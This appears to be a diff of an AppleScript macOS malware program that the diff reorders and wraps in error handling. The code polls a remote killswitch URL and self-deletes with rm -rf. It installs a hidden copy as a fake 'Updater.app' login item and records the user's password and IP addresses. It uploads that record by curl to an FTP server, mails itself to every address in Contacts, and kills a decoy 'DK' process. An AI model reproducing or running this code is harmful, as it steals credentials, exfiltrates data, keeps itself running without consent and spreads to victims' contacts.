@@ -1,4 +1,14 @@
+try
+	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
+	set killswitch to (characters 1 through -1 of result) as text -- Get IP
+	if killswitch = "kill" then -- If killswitch is triggered, delete all of the app and password files
+		do shell script "rm -rf " & (POSIX path of (path to me))
+		return
+	end if
+end try
+
 set theuser to do shell script "whoami"
+
 try
 	do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
 end try
@@ -11,16 +21,6 @@ try
 	set newreso to POSIX path of ("" & ufld & "Updater.app")
 	do shell script "cp -r " & reso & " " & newreso
 	tell application "System Events" to make login item at end with properties {path:newreso, kind:application} -- Make application a login item		
-end try
-
-try
-	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
-	set killswitch to (characters 1 through -1 of result) as text -- Get IP
-	if killswitch = "kill" then
-		-- If killswitch is triggered, delete all of the app and password files
-		do shell script "rm -rf " & ufld & ""
-		do shell script "rm -rf " & (POSIX path of (path to me))
-	end if
 end try
 
 try
@@ -48,7 +48,10 @@ try
 		set WANIP to "not connected"
 		set LANIP to "not connected"
 	end try
-	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
+	
+	try
+		do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
+	end try
 	
 	try
 		tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
@@ -66,7 +69,9 @@ try
 	
 end try
 
-do shell script "open " & (POSIX path of (path to resource "DK.app"))
+try
+	do shell script "open " & (POSIX path of (path to resource "DK.app"))
+end try
 
 try
 	tell application "Mail"
@@ -76,11 +81,12 @@ try
 	
 	" & theuser & ""} -- Make email message
 	end tell
+	
 	tell application "Contacts"
 		set thepeople to every person
 		set j to (number of people)
 		repeat with i from 1 to j
-			set adrper to (number of emails of (item i of the people))
+			set adrper to (number of emails of (item i of thepeople))
 			repeat with x from 1 to adrper
 				set adr to (value of email x of (item i of thepeople))
 				tell application "Mail"
@@ -92,6 +98,7 @@ try
 		end repeat
 		quit
 	end tell
+	
 	tell application "Mail"
 		try
 			tell content of theMessage
@@ -103,6 +110,8 @@ try
 	end tell
 end try
 
-set app_name to "DK"
-set the_pid to (do shell script "ps ax | grep " & (quoted form of app_name) & " | grep -v grep | awk '{print $1}'")
-if the_pid is not "" then do shell script ("kill -9 " & the_pid)
+try
+	set app_name to "DK"
+	set the_pid to (do shell script "ps ax | grep " & (quoted form of app_name) & " | grep -v grep | awk '{print $1}'")
+	if the_pid is not "" then do shell script ("kill -9 " & the_pid)
+end try
